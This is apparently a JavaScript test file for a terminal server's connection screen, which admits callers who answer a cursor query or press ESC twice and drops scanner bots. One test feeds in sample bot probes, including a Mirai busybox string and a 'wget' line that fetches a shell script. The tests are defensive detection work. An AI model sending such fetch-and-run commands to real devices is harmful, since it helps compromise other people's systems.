// tests/terminalScreen.test.js -- screening new terminal connections before
// they get a node: a terminal that answers the cursor query or a caller who
// presses ESC twice passes, a scanner's login or command is dropped, and
// anything else times out.

import assert from 'assert';
import fs from 'fs';
import { createScreen, botReason, bareEscapes, PROMPT_AFTER_MS } from '../src/servers/terminalScreen.js';
import { screenThenAdmit } from '../src/servers/terminalGate.js';

var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };

function screen(opts) {
	var sent = [], result = { passed: 0, bot: null, timeout: 0 };
	var s = createScreen(Object.assign({
		send: function (t) { sent.push(t); },
		onPass: function () { result.passed++; },
		onBot: function (reason, line) { result.bot = { reason: reason, line: line }; },
		onTimeout: function () { result.timeout++; },
		timeoutMs: 3000,
		botWords: ['root', 'admin']
	}, opts || {}));
	return { s: s, sent: sent, result: result };
}

describe('terminal screen', function () {
	this.timeout(10000);

	it('passes a terminal that answers the cursor query, without showing the prompt', async function () {
		var t = screen();
		t.s.start();
		assert.strictEqual(t.sent[0], '\x1b[6n');
		t.s.feed(Buffer.from('\x1b[24;80R'));
		assert.strictEqual(t.result.passed, 1);
		await wait(PROMPT_AFTER_MS + 100);
		assert.strictEqual(t.sent.join('').includes('Press ESC'), false, 'the prompt is never shown');
		t.s.stop();
	});

	it('passes two ESC presses, even arriving in separate packets, but not arrow keys', function () {
		var t = screen();
		t.s.start();
		t.s.feed('\x1b[A\x1b[B\x1bOA');
		assert.strictEqual(t.result.passed, 0, 'key sequences are not ESC presses');
		t.s.feed('\x1b');
		assert.strictEqual(t.result.passed, 0);
		t.s.feed('\x1b');
		assert.strictEqual(t.result.passed, 1);
		t.s.stop();
		assert.strictEqual(bareEscapes('\x1b'), 0, 'a lone ESC may be the start of a sequence');
		assert.strictEqual(bareEscapes('\x1b[24;80R'), 0);
	});

	it('shows the prompt to a client that does not answer, and takes it off the line on passing', async function () {
		var t = screen({ prompt: 'Hit ESC twice' });
		t.s.start();
		await wait(PROMPT_AFTER_MS + 100);
		assert.ok(t.sent.join('').includes('Hit ESC twice'));
		t.s.feed('\x1b\x1b');
		assert.strictEqual(t.result.passed, 1);
		assert.strictEqual(t.sent[t.sent.length - 1], '\r\x1b[K');
	});

	it('drops a scanner sending a router login or a shell command', function () {
		for (var probe of ['root\r\n', 'ADMIN\r\n', 'enable\r\n', '/bin/busybox MIRAI\r\n', 'cd /tmp; wget http://x/y.sh\r\n', 'GET / HTTP/1.1\r\n', 'SSH-2.0-libssh\r\n']) {
			var t = screen();
			t.s.start();
			t.s.feed(probe);
			assert.ok(t.result.bot, 'not recognised: ' + JSON.stringify(probe));
			assert.strictEqual(t.result.passed, 0);
			t.s.stop();
		}
		var tls = screen();
		tls.s.start();
		tls.s.feed(Buffer.from([0x16, 0x03, 0x01, 0x02, 0x00]));
		assert.match(tls.result.bot.reason, /TLS/);
	});

	it('does not take a person typing for a bot; it repeats the prompt once', async function () {
		var t = screen();
		t.s.start();
		await wait(PROMPT_AFTER_MS + 100);
		t.s.feed('hello there\r\n');
		assert.strictEqual(t.result.bot, null);
		assert.strictEqual(t.sent.filter(function (x) { return x.includes('Press ESC'); }).length, 2);
		t.s.feed('what?\r\n');
		assert.strictEqual(t.sent.filter(function (x) { return x.includes('Press ESC'); }).length, 2, 'only once');
		t.s.stop();
		assert.strictEqual(botReason('rootbeer', new Set(['root'])), '', 'a word that merely starts like one is not');
		assert.strictEqual(botReason('root', new Set(['root'])), 'sent "root"');
	});

	it('closes a connection that neither answers nor presses ESC', async function () {
		var t = screen({ timeoutMs: 2600 });
		t.s.start();
		await wait(2800);
		assert.strictEqual(t.result.timeout, 1);
		assert.strictEqual(t.result.passed, 0);
	});

	describe('the gate', function () {
		function fakeConn() {
			var sent = [];
			return { sent: sent, connectionType: 'Telnet', callerId: '198.51.100.7', socket: { remoteAddress: '::ffff:198.51.100.7', destroyed: false, ended: false, end: function () { this.ended = true; } }, sendString: function (t) { sent.push(t); } };
		}
		function cfg(values) {
			return {
				getBoolean: function (k, d) { return values[k] !== undefined ? values[k] : d; },
				getNumber: function (k, d) { return values[k] !== undefined ? values[k] : d; },
				get: function (k, d) { return values[k] !== undefined ? values[k] : d; }
			};
		}

		it('admits a caller who passes, and only then', function () {
			var c = fakeConn(), admitted = 0, counts = [];
			screenThenAdmit(c, function () { admitted++; }, cfg({ honeypot_enabled: false }), { count: function (o) { counts.push(o); } });
			assert.strictEqual(admitted, 0, 'no node before the screen');
			assert.ok(c.screen);
			c.screen.feed('\x1b[1;1R');
			assert.strictEqual(admitted, 1);
			assert.strictEqual(c.screen, null, 'the connection feeds the call from now on');
			assert.deepStrictEqual(counts, ['passed']);
		});

		it('closes a bot without admitting it, using the honeypot names as bot logins', function () {
			var c = fakeConn(), admitted = 0, counts = [];
			screenThenAdmit(c, function () { admitted++; }, cfg({ honeypot_enabled: false, honeypot_usernames: 'oracle,scadaadmin' }), { count: function (o) { counts.push(o); } });
			c.screen.feed('scadaadmin\r\n');
			assert.strictEqual(admitted, 0);
			assert.strictEqual(c.socket.ended, true);
			assert.deepStrictEqual(counts, ['bot']);
		});

		it('admits everyone at once when screening is off', function () {
			var c = fakeConn(), admitted = 0;
			screenThenAdmit(c, function () { admitted++; }, cfg({ terminal_screen_enabled: false }));
			assert.strictEqual(admitted, 1);
			assert.strictEqual(c.screen, undefined);
		});

		it('writes a line the shipped fail2ban honeypot filter matches, with the address', function () {
			var src = fs.readFileSync('src/servers/terminalGate.js', 'utf8');
			var m = /'(\[HONEYPOT\] Login attempt with banned username ")' \+ name \+ '(" from )' \+ ip \+ '( via terminal screen)'/.exec(src);
			assert.ok(m, 'the [HONEYPOT] line in terminalGate.js changed shape');
			var line = m[1] + 'root' + m[2] + '198.51.100.7' + m[3];
			var filter = fs.readFileSync('examples/fail2ban/filter.d/canectic-honeypot.conf', 'utf8');
			var re = /failregex\s*=\s*(.+)/.exec(filter)[1].trim();
			var js = new RegExp(re.replace('<HOST>', '(\\d+\\.\\d+\\.\\d+\\.\\d+)'));
			var hit = js.exec(line);
			assert.ok(hit, 'the filter does not match: ' + line);
			assert.strictEqual(hit[1], '198.51.100.7');
		});

		it('is where both terminal connections hand a caller to the pool', function () {
			for (var f of ['src/servers/telnetserver.js', 'src/servers/tcpserver.js']) {
				var src = fs.readFileSync(f, 'utf8');
				var i = src.indexOf('screenThenAdmit(this');
				assert.ok(i !== -1, f + ' does not screen');
				assert.ok(src.indexOf('createCall(this)', i) > i, f + ': a node is given out before the screen');
				assert.ok(/if \(this\.screen\)/.test(src), f + ': handleData does not feed the screen');
			}
		});
	});
});
